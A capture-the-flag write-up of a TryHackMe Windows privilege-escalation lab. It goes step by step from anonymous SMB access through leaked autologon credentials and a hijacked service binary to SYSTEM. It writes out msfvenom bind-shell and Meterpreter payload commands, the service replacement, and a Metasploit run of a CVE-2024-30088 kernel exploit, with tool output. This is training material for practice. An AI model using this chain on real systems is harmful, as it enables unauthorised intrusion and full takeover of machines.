# Windows Jump: CTF Writeup
**Alias:** ByteChef  
**Event:** TryHackMe  
**Room:** [Windows Jump](https://tryhackme.com/room/windowsjump)  
**Category:** Windows Privilege Escalation  
**Difficulty:** Medium  
**Flags:** 4

---

## Mission Briefing

> A routine vulnerability scan flagged a Windows machine on the internal network: nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Escalate from guest access all the way through to SYSTEM.

**Escalation Chain:** `guest → thmuser → notadmin → svcadmin → SYSTEM`

---

## Reconnaissance

### Target: `10.146.129.209`

```bash
nmap -A 10.146.129.209
```

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

**Key findings:**
- SMB (445): potential anonymous access
- RDP (3389): interactive access
- WinRM (5985): remote management
- Windows Server 2019 (10.0.17763)

---

## Flag 1: SMB Credentials in Public Share

### Enumeration

```bash
smbclient -L //10.146.129.209 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share
```

A `Public` share accessible without credentials. Connected and found `welcome.txt`:

```bash
smbclient //10.146.129.209/Public -N
smb: \> get welcome.txt
```

```
Welcome to CORP-NET.
New employee default credentials
================================
Username : thmuser
Password : Password1!
Please change your password after first login.
```

**Flag 1:** `THM{5mb_cr3d5_1n_th3_5h4r3}`

---

## Flag 2: Winlogon Autologon Credentials

### RDP Access

Connected via RDP as `thmuser`:

```bash
xfreerdp /u:thmuser /p:'Password1!' /v:10.146.129.209 /cert:ignore /drive:share,/tmp
```

### Winlogon Registry Query

From cmd, queried the Winlogon registry key: a classic location for autologon credentials stored in plaintext:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
```

Used `runas` to pivot to `notadmin`:

```cmd
runas /user:notadmin cmd
```

**Flag 2:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`

---

## Flag 3: Service Binary Hijacking

### Service Enumeration

From the notadmin cmd window, enumerated running services:

```cmd
wmic service get name,startname,pathname
```

Spotted a non-standard service:

```
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

### Permission Check

```cmd
icacls C:\Windows\THMSVC
icacls C:\Windows\THMSVC\svc.exe
```

```
C:\Windows\THMSVC PRIVESC\notadmin:(OI)(CI)(F)
C:\Windows\THMSVC\svc.exe Everyone:(F)
                           PRIVESC\notadmin:(I)(F)
```

`notadmin` has **Full Control** over the THMSVC directory and `svc.exe`. Classic service binary hijack.

### Exploitation

Generated a bind shell payload as a proper Windows service executable:

```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=5555 -f exe-service -o /tmp/svc.exe
```

Transferred via the RDP drive mount and replaced the service binary:

```cmd
copy \\TSCLIENT\share\svc.exe C:\Windows\THMSVC\svc.exe /y
sc stop THMSvc
sc start THMSvc
```

Connected to the bind shell:

```bash
nc 10.146.129.209 5555
```

Shell returned as `privesc\svcadmin`. Read flag3 from the desktop:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

**Flag 3:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`

---

## Flag 4: CVE-2024-30088 Kernel Exploit → SYSTEM

### Meterpreter Session

Replaced the bind shell payload with a Meterpreter service binary:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe-service -o /tmp/svc.exe
```

Started a handler in Metasploit:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.146.129.209
set LPORT 5555
run
```

Got a Meterpreter session as `PRIVESC\svcadmin`.

### Local Exploit Suggester

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Key findings:
```
exploit/windows/local/cve_2024_30088_authz_basep  → Vulnerable
exploit/windows/local/cve_2021_40449              → Vulnerable
exploit/windows/local/cve_2022_21882_win32k       → Vulnerable
```

### CVE-2024-30088: AuthzBasep Privilege Escalation

```
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION 1
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.146.129.209
set LPORT 8888
run
```

```
[+] The target appears to be vulnerable.
[+] Successfully stole winlogon handle: 400
[+] Successfully retrieved winlogon pid: 528
[*] Meterpreter session 2 opened
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Dropped to shell and read the final flag:

```cmd
type C:\flag4.txt
```

**Flag 4:** `THM{t4sk_wr1t3_t0_SYST3M}`

---

## Attack Chain Summary

```
1. SMB enumeration → Public share → welcome.txt → thmuser:Password1!
2. RDP as thmuser → Winlogon registry → notadmin:P@ssw0rd!
3. notadmin → THMSVC writable → svc.exe hijack → svcadmin shell
4. svcadmin → Meterpreter → CVE-2024-30088 → NT AUTHORITY\SYSTEM
```

---

## Key Lessons

### 1. Public SMB Shares Are a Gold Mine
Anonymous SMB access is still common on older or misconfigured machines. Always enumerate shares before anything else: credentials left in plaintext files are a surprisingly common finding.

### 2. Winlogon Autologon Is a Classic Privesc
Autologon credentials stored in the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` are a well-known but still frequently found misconfiguration. Always check this key early in Windows enumeration.

### 3. Check Service Binary Permissions
Non-standard services running as privileged accounts with world-writable binaries are highly exploitable. `wmic service get name,startname,pathname` combined with `icacls` is a powerful combination for identifying these.

### 4. Meterpreter + Local Exploit Suggester
When manual techniques hit a wall (no `SeImpersonatePrivilege`, Defender blocking tools), the local exploit suggester is invaluable. CVE-2024-30088 was the winning ticket on a fully patched-looking Server 2019 box.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| smbclient | SMB share enumeration and file retrieval |
| xfreerdp | RDP access with drive mounting |
| msfvenom | Payload generation (bind shell, Meterpreter) |
| Metasploit | Meterpreter handler, local exploit suggester, CVE-2024-30088 |
| netcat | Bind shell interaction |
| mimikatz | Credential dumping attempts |
| Evil-WinRM | WinRM access attempts |
| impacket | psexec/wmiexec attempts |

---

*Written by ByteChef: [GitHub Portfolio](https://github.com)*
